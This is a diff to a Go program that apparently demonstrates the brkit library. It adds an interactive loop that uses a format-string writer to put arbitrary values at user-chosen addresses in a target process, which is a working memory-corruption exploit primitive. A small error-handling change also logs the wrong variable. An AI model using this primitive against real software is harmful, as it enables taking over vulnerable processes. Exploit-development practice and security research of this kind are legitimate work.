@@ -7,6 +7,7 @@ import (
 	"log"
 	"os"
 	"os/exec"
+	"strconv"
 	"strings"
 
 	"github.com/stephen-fox/brkit/memory"
@@ -43,7 +44,7 @@ func main() {
 	}
 	proc.SetLogger(muyVerbose)
 
-	leakParams(proc)
+	writeMemoryLoop(proc)
 }
 
 func leakParams(proc *process.Process) {
@@ -126,15 +127,68 @@ func leakMemoryAtLoop(proc *process.Process) {
 			log.Fatalln(err)
 		}
 
-		pointer := memory.HexStringToPointerOrExit(
+		pointer, convErr := memory.HexStringToPointer(
 			pointerStr[0:len(pointerStr)-1],
 			memory.PointerMakerForX86(),
 			64)
+		if convErr != nil {
+			log.Printf("failed to convert pointer string - %s", err)
+			continue
+		}
 
 		log.Printf("parsed pointer as '%s' (0x%x)", pointer.HexString(), pointer)
 
 		raw := leaker.MemoryAtOrExit(pointer)
 
 		log.Printf("read: 0x%x", raw)
+	}
+}
+
+func writeMemoryLoop(proc *process.Process) {
+	writer := memory.NewDPAFormatStringWriterOrExit(memory.DPAFormatStringWriterConfig{
+		MaxWrite:  999,
+		DPAConfig: memory.FormatStringDPAConfig{
+			ProcessIOFn: func() memory.ProcessIO {
+				return proc
+			},
+			MaxNumParams: 200,
+			PointerSize:  8,
+			Verbose:      verbose,
+		},
+	})
+
+	for {
+		log.Printf("please enter a memory address to write to and a number followed by 'enter':\n")
+		str, err := bufio.NewReader(os.Stdin).ReadString('\n')
+		if err != nil {
+			log.Fatalln(err)
+		}
+
+		parts := strings.Split(strings.TrimSpace(str), " ")
+		if len(parts) < 2 {
+			log.Printf("please enter two values")
+			continue
+		}
+
+		pointer, convErr := memory.HexStringToPointer(
+			parts[0],
+			memory.PointerMakerForX86(),
+			64)
+		if convErr != nil {
+			log.Printf("failed to convert pointer string - %s", convErr)
+			continue
+		}
+
+		log.Printf("parsed pointer as '%s' (0x%x)", pointer.HexString(), pointer)
+
+		num, convErr := strconv.Atoi(parts[1])
+		if convErr != nil {
+			log.Printf("failed to convert number string - %s", convErr)
+			continue
+		}
+
+		writer.WriteAtOrExit(num, pointer)
+
+		log.Printf("wrote %d to %s", num, pointer.HexString())
 	}
 }
